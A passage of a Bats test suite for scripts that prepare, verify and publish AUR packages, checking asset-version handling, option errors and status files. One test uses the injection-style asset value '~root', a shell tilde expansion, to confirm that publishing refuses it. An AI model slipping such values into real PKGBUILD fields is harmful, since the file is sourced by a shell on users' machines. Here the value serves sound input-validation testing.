  [[ "$output" == *"Prepared PKGBUILD has _deb=${V250}, expected ${V250%-1}-2"* ]]
  [ "$(git -C "$AUR_REMOTE" rev-parse HEAD)" = "$AUR_BASE" ]
}

@test "publish-pkg: writes current_asset when the AUR already has the update" {
  setup_asset_package 2.4.6 "$V246_3" 2 2.4.6 "$V246_3" 2
  yq -i ".current_asset = \"$V246_2\"" "$TEST_TMPDIR/packages/demo.yml"
  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 2.4.6 --asset "$V246_3" --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 2 ]
  run "$TEST_TMPDIR/scripts/publish-pkg.sh" demo 2.4.6 "$TEST_TMPDIR/out/demo" --asset "$V246_3"
  [ "$status" -eq 2 ]
  [ "$(yq -r .current_asset "$TEST_TMPDIR/packages/demo.yml")" = "$V246_3" ]
}

@test "publish-pkg: a package with asset_var needs --asset" {
  setup_asset_package 2.4.6 "$V246_3" 1 2.5.0rc1 "$V250" 1
  "$TEST_TMPDIR/scripts/update-pkg.sh" demo 2.5.0rc1 --asset "$V250" --prepare "$TEST_TMPDIR/out"
  run "$TEST_TMPDIR/scripts/publish-pkg.sh" demo 2.5.0rc1 "$TEST_TMPDIR/out/demo"
  [ "$status" -eq 1 ]
  [[ "$output" == *"upstream.asset_var is set, so --asset is needed"* ]]
}

@test "publish-pkg: --asset needs a value" {
  setup_publish
  run "$TEST_TMPDIR/scripts/publish-pkg.sh" demo 1.1.0 "$PREPARED" --asset
  [ "$status" -eq 1 ]
  [[ "$output" == *"--asset needs a value"* ]]
}

@test "publish-pkg: refuses an unknown option" {
  setup_publish
  run "$TEST_TMPDIR/scripts/publish-pkg.sh" demo 1.1.0 "$PREPARED" --force
  [ "$status" -eq 1 ]
  [[ "$output" == *"Unknown option: --force"* ]]
  [ "$(git -C "$AUR_REMOTE" rev-parse HEAD)" = "$AUR_BASE" ]
}

# Helper: pkg with asset_regex at <current>, the status of the check run
# for it and the asset value that run recorded, if any
# Usage: checked_asset_package <current> <status> [asset value]
checked_asset_package() {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
  asset_regex: '^pkg_(.+)\\.tar\\.gz\$'
  asset_var: _pkg
current: '$1'
current_asset: '$1-a'"
  checked_status pkg "$2"
  if [[ -n "${3:-}" ]]; then
    printf 'pkg\t%s\nother\t9.9-z\n' "$3" >"$TEST_TMPDIR/.status/_assets"
  fi
}

@test "check-all --prepare: keeps an asset package up to date without a value" {
  checked_asset_package 1.0.0 up_to_date
  stub_script update-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ "$(cat "$TEST_TMPDIR/out/status/pkg")" = "up_to_date" ]
}

@test "check-all --prepare: passes the asset value of the check run" {
  checked_asset_package 1.0.0 "new_version: 2.0.0" 2.0.0-a
  stub_script update-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ "$(cat "$TEST_TMPDIR/update-pkg.sh.args")" = "pkg 2.0.0 --asset 2.0.0-a --prepare $TEST_TMPDIR/out/prepared" ]
  [ "$(cat "$TEST_TMPDIR/out/status/pkg")" = "new_version: 2.0.0" ]
}

@test "check-all --prepare: prepares a rebuild" {
  checked_asset_package 1.0.0 "new_build: 1.0.0" 1.0.0-b
  stub_script update-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ "$(cat "$TEST_TMPDIR/update-pkg.sh.args")" = "pkg 1.0.0 --asset 1.0.0-b --prepare $TEST_TMPDIR/out/prepared" ]
  [ "$(cat "$TEST_TMPDIR/out/status/pkg")" = "new_build: 1.0.0" ]
}

@test "check-all --prepare: prepares nothing while the asset is pending" {
  checked_asset_package 1.0.0 "pending: 2.0.0"
  stub_script update-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ ! -e "$TEST_TMPDIR/update-pkg.sh.args" ]
  [ "$(cat "$TEST_TMPDIR/out/status/pkg")" = "pending: 2.0.0" ]
  [ "$(cat "$TEST_TMPDIR/out/status/_error_count")" = "0" ]
}

@test "check-all --prepare: fails a package without an asset value from the check run" {
  checked_asset_package 1.0.0 "new_version: 2.0.0"
  stub_script update-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ ! -e "$TEST_TMPDIR/update-pkg.sh.args" ]
  [ "$(cat "$TEST_TMPDIR/out/status/pkg")" = "check_failed: no asset value from the check run" ]
}

@test "check-all --publish: publishes with the asset value of the check run" {
  checked_asset_package 1.0.0 "new_version: 2.0.0" 2.0.0-a
  mkdir -p "$TEST_TMPDIR/out/prepared/pkg"
  stub_script publish-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ "$(cat "$TEST_TMPDIR/publish-pkg.sh.args")" = "pkg 2.0.0 $TEST_TMPDIR/out/prepared/pkg --asset 2.0.0-a" ]
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "updated: 2.0.0" ]
}

@test "check-all --publish: publishes a rebuild" {
  checked_asset_package 1.0.0 "new_build: 1.0.0" 1.0.0-b
  mkdir -p "$TEST_TMPDIR/out/prepared/pkg"
  stub_script publish-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ "$(cat "$TEST_TMPDIR/publish-pkg.sh.args")" = "pkg 1.0.0 $TEST_TMPDIR/out/prepared/pkg --asset 1.0.0-b" ]
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "rebuilt: 1.0.0" ]
}

@test "check-all --publish: keeps a pending asset and publishes nothing" {
  checked_asset_package 1.0.0 "pending: 2.0.0"
  stub_script publish-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ ! -e "$TEST_TMPDIR/publish-pkg.sh.args" ]
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "pending: 2.0.0" ]
  [ "$(cat "$TEST_TMPDIR/.status/_error_count")" = "0" ]
}

@test "check-all --publish: refuses an asset value of the check run that a PKGBUILD must not hold" {
  checked_asset_package 1.0.0 "new_version: 2.0.0" '~root'
  mkdir -p "$TEST_TMPDIR/out/prepared/pkg"
  stub_script publish-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ ! -e "$TEST_TMPDIR/publish-pkg.sh.args" ]
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "check_failed: no asset value from the check run" ]
}

@test "verify-pkg: refuses a prepared PKGBUILD without the asset line" {
  setup_asset_package 2.4.6 "$V246_3" 1 2.5.0rc1 "$V250" 1
  "$TEST_TMPDIR/scripts/update-pkg.sh" demo 2.5.0rc1 --asset "$V250" --prepare "$TEST_TMPDIR/out"
  sed -i '/^_deb=/d' "$TEST_TMPDIR/out/demo/PKGBUILD"
  mock_downloads
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$TEST_TMPDIR/out/demo"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared PKGBUILD needs one _deb= line, it has 0"* ]]
}
